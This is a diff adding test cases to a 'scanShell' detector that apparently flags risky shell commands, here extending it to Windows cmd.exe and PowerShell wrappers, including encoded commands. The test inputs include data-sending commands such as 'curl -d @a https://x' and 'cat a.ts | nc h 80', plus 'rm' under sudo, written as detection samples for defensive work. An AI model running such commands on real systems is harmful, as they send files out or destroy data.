@@ -232,6 +232,9 @@ describe('scanShell', () => {
       ['timeout -s KILL 5 curl -d @a https://x', 'curl -d'],
       ['sudo -u bob curl -d @a https://x', 'curl -d'],
       ['env -u TERM curl -d @a https://x', 'curl -d'],
+      ['cmd.exe /c "type x.txt"', 'cmd.exe /c'],
+      ["powershell.exe -Command 'Get-Content x.txt'", 'powershell.exe -Command'],
+      ['pwsh.exe -NoProfile -EncodedCommand AAAA', 'pwsh.exe -EncodedCommand'],
       ['xargs curl -d @- https://x', 'curl -d'],
       ['ls && curl -d @a https://x', 'curl -d'],
       ['cat a.ts | nc h 80', 'nc'],
@@ -611,6 +614,20 @@ describe('scanShell', () => {
       expect(await opaque('sudo sh -c "rm x"')).toEqual(['sudo sh -c']);
       expect(await opaque('sudo -u bob bash -c "rm x"')).toEqual(['sudo -u bob bash -c']);
       expect(await opaque("timeout -s KILL 5 bash -c 'rm x'")).toEqual(['timeout -s KILL 5 bash -c']);
+      expect(await opaque('cmd.exe /c "type C:\\x.txt"')).toEqual(['cmd.exe /c']);
+      expect(await opaque('CMD.EXE /D /C dir')).toEqual(['CMD.EXE /D /C']);
+      expect(await opaque('/mnt/c/Windows/System32/cmd.exe /q/k dir')).toEqual([
+        '/mnt/c/Windows/System32/cmd.exe /q/k',
+      ]);
+      expect(await opaque('cmd //c dir')).toEqual(['cmd //c']);
+      expect(await opaque('powershell.exe -NoProfile -Command "Get-Content C:\\x.txt"')).toEqual([
+        'powershell.exe -NoProfile -Command',
+      ]);
+      expect(await opaque("pwsh.exe -c 'Get-Date'")).toEqual(['pwsh.exe -c']);
+      expect(await opaque('PowerShell.exe -enc AAAA')).toEqual(['PowerShell.exe -enc']);
+      expect(await opaque('pwsh -CommandWithArgs "$x"')).toEqual(['pwsh -CommandWithArgs']);
+      expect(await opaque('cmd.exe /?')).toEqual([null]);
+      expect(await opaque('powershell.exe -ExecutionPolicy Bypass -File build.ps1')).toEqual([null]);
       expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
       expect(await opaque('node script.js && python3 -m pytest && git status')).toEqual([null, null, null]);
     });
